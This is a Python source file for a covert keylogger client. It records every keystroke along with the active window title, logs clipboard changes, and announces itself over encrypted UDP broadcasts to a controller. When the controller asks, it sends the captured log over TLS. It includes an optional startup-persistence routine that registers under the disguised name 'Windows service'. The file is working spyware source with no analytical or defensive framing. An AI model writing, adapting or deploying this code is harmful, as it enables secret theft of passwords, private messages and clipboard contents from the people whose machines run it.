import socket
from time import sleep
import utils
from shared import BD_PORT, HOST_PORT
import sys
from getpass import getuser
from os import path
import os
import pyperclip
from datetime import datetime
from threading import Thread
import ssl
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
import keyboard
from string import printable
import netifaces

def broadcast_myself():
    """
    Repeatedly broadcasts the client so the controller will find it. All encrypted.
    """
    global conn, cipher_rsa
    BDs = socket.socket(type=socket.SOCK_DGRAM)
    while True:
        if not connected:
            BDs.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            localIP = socket.gethostbyname(socket.gethostname())
            for bd in utils.broadcast_addresses():
                BDs.sendto(cipher_rsa.encrypt(b"hello"),
                        (bd, BD_PORT))
        sleep(BD_INTERVAL)
    BDs.close()


def listen():
    """
    Listens for incoming connection by the serber and sends him the keylog when requested. All encrypted.
    """
    global CERT_FILE, connected, log
    listener = socket.socket()
    utils.set_keepalive(listener)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("", HOST_PORT))
    listener.listen(1)
    while True:
        conn, _ = listener.accept()
        connected = True
        conn = ssl.wrap_socket(
            sock=conn, ca_certs=CERT_FILE, cert_reqs=ssl.CERT_REQUIRED)
        while True:
            try:
                if utils.recv_msg(conn) == "send file":
                    utils.send_msg(conn, log)
                    log = ""
            except (socket.timeout, socket.error):
                conn.close()
                connected = False
                break
    listener.close()


def header(text):
    """
    Formats the input to a header style

    Args:
        text: text to format

    Returns:
        formatted text
    """
    return "\n{0}\n{1}{2}{1}\n{0}\n".format("=" * (len(text) + 20),
                                            " " * (((len(text) + 20) // 2) - (len(text) // 2)), text)


def clipboard_listener():
    """
    Polls the clipboard and outputs it to the buffer when changed
    """
    global log, CLIP_POLL_RATE
    last_clip = ""
    while True:
        curr_clip = pyperclip.paste()
        if curr_clip != last_clip:
            log += header("START CLIPBOARD")
            log += curr_clip
            log += header("END CLIPBOARD")
            last_clip = curr_clip
        sleep(CLIP_POLL_RATE)


def on_key_down(event):
    """
    Records all keyboard ebents and in which program they were sent and outputs them to the buffer nicely formatted

    Args:
        event: keyboard ebent
    """
    global last_win, log, BANNED_BUTTONS
    modifiers = utils.get_modifiers()
    curr_win = utils.get_foreground_window_title()
    un_char = utils.SC_to_unicode(event.scan_code)
    unsided_name = event.name[event.name.find(" ")+1:]
    if __debug__:
        print("Modifiers", modifiers)
        print("Unicode:", un_char)
        print("Scan code:", event.scan_code)
        print("Description:", event.name)
    if curr_win != last_win:
        log += header(curr_win)
        last_win = curr_win
    if (un_char or event.name in printable[:-5]) and not modifiers["ctrl"]:
        log += un_char if un_char else event.name
    elif not utils.is_modifier(unsided_name) and unsided_name not in BANNED_BUTTONS:
        log += "{{{}}}".format("".join([mod + "+" for mod in modifiers.keys()
                                        if modifiers[mod]]) + unsided_name).upper()


if __name__ == "__main__":
    BD_INTERVAL = 2
    CLIP_POLL_RATE = 5
    STARTUP = False
    STARTUP_NAME = "Windows service"
    CERT_FILE = utils.resource_path("cert.pem")
    BANNED_BUTTONS = ["menu", "caps lock"]

    connected = False
    last_win = ""
    log = header("KEYLOG STARTED AT {:%Y-%m-%d %H:%M} BY USER {} ON {}".format(
        datetime.now(), getuser(), os.environ['COMPUTERNAME']))
    public_key = RSA.import_key(open(CERT_FILE).read())
    cipher_rsa = PKCS1_OAEP.new(public_key)

    if STARTUP:
        utils.register_startup(STARTUP_NAME, path.realpath(__file__))

    Thread(target=broadcast_myself, daemon=True).start()
    Thread(target=listen, daemon=True).start()
    Thread(target=clipboard_listener, daemon=True).start()

    keyboard.on_press(on_key_down)
    keyboard.wait()
